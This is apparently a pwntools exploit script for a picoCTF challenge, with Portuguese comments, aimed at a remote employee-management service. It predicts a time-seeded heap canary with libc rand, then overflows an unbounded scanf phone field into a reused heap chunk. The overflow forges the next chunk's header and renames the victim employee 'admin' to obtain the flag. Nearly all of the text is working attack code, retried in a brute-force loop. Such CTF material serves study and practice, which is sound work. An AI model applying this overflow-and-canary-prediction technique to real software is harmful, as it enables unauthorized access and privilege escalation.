from pwn import *
from ctypes import CDLL
import time

HOST = "wily-courier.picoctf.net"
PORT = 61975

context.log_level = "info"

libc = CDLL("libc.so.6")

# scanf("%s") corta em whitespace, então o canary não pode conter esses bytes.
BAD = {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}

def predict_canary(ts):
    libc.srand(ts)
    return libc.rand()

def safe_for_scanf(x):
    return all(b not in BAD for b in p32(x))

def menu(p, op):
    p.sendlineafter(b"4) Get access token", str(op).encode())

def add_employee(p, name, salary=b"1111", phone=b"11111111", email=False, email_data=b"", bldg=False):
    menu(p, 1)
    p.sendlineafter(b"Name: ", name)

    p.sendlineafter(b"Email (y/n)? ", b"y" if email else b"n")
    if email:
        p.sendlineafter(b"Email address: ", email_data)

    p.sendlineafter(b"Salary: ", salary)

    # Vulnerabilidade:
    # o binário usa scanf("%s", employee + 0x18), sem limite.
    p.sendlineafter(b"Phone #: ", phone)

    p.sendlineafter(b"Bldg (y/n)? ", b"y" if bldg else b"n")
    if bldg:
        p.sendlineafter(b"Bldg #: ", b"0")

def remove_employee(p, idx):
    menu(p, 2)
    p.sendlineafter(b"Employee #?", str(idx).encode())

def get_token(p, idx):
    menu(p, 4)
    p.sendlineafter(b"Employee #?", str(idx).encode())

def attempt(canary):
    p = remote(HOST, PORT)

    try:
        # employee 0
        add_employee(
            p,
            name=b"AAAA",
            salary=b"1111",
            phone=b"11111111",
            email=False,
            bldg=False
        )

        # employee 1, vítima. Inicialmente não é admin.
        add_employee(
            p,
            name=b"victim",
            salary=b"2222",
            phone=b"22222222",
            email=False,
            bldg=False
        )

        # Libera employee 0 para reutilizar esse chunk antes do employee 1.
        remove_employee(p, 0)

        # Offset confirmado localmente:
        # phone do employee 0 recriado -> header do employee 1 = 28 bytes
        # phone do employee 0 recriado -> user data do employee 1 = 40 bytes
        payload  = b"A" * 28

        # Header válido do employee 1:
        # canary correto
        # size|allocated = 52|1 = 53
        # prev_size|prev_allocated = 52|1 = 53
        payload += p32(canary)
        payload += p32(53)
        payload += p32(53)

        # Transforma o começo do employee 1 em admin\x00 depois da checagem anti-admin.
        payload += b"admin\x00"

        add_employee(
            p,
            name=b"CCCC",
            salary=b"3333",
            phone=payload,
            email=False,
            bldg=False
        )

        # Agora employee 1 começa com admin\x00, então Get access token deve imprimir a flag.
        get_token(p, 1)

        out = p.recvall(timeout=3)
        print(out.decode(errors="replace"))

        if b"picoCTF{" in out:
            log.success("FLAG ENCONTRADA")
            return True

        return False

    except EOFError:
        log.warning("conexao morreu; canary provavelmente errado")
        return False
    finally:
        try:
            p.close()
        except:
            pass

for round_id in range(80):
    now = int(time.time())

    candidates = []
    for ts in range(now - 5, now + 8):
        c = predict_canary(ts)
        if safe_for_scanf(c):
            candidates.append((ts, c))

    for ts, canary in candidates:
        log.info(f"round={round_id} tentando ts={ts} canary={canary:#x} bytes={p32(canary)!r}")
        if attempt(canary):
            raise SystemExit

    time.sleep(0.15)

log.failure("nao pegou nessa execucao; rode novamente")
